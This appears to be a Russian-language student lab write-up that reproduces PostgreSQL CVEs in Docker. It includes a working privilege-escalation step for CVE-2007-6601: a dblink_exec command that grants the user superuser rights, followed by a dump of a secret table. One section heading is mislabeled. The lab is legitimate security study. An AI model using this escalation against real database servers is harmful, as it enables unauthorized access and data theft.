# Лабораторная работа №1
Лабораторная работа лежит в [репозитории](https://github.com/x4m/pg_cve_demo)
```shell
git clone https://github.com/x4m/pg_cve_demo.git
```
## CVE-2007-6601
Уязвимая версия Postgres поднимается в docker контейнере
```shell
cd CVE-2007-6601
docker compose up
```
![](img/image.png)

Подключение к БД
```shell
psql postgresql://user1:password@127.0.0.1:5432/db1
```

dblink к secret_db
```psql
SELECT dblink_exec('host=localhost dbname=secret_db', 'ALTER USER user1 WITH SUPERUSER;');
```
Переключает текущее подключение на базу secret_db
```psql
\c secret_db;
```
Выводит все данные из таблицы secret_table
```psql
select * from secret_table;
```
![](img/image2.png)

## CVE-2018-10915
```shell
cd CVE-2018-10915
docker compose up
```
```
psql postgresql://user1:password@127.0.0.1:5432/db1
```
![](img/image3.png)
```
psql postgresql://postgres:password@127.0.0.1:5433
```
![](img/image4.png)

## CVE-2020-14349
```shell
cd CVE-2020-14349
docker compose up
```
## CVE-2020-14349
```shell
cd CVE-2022-1552
docker compose up
```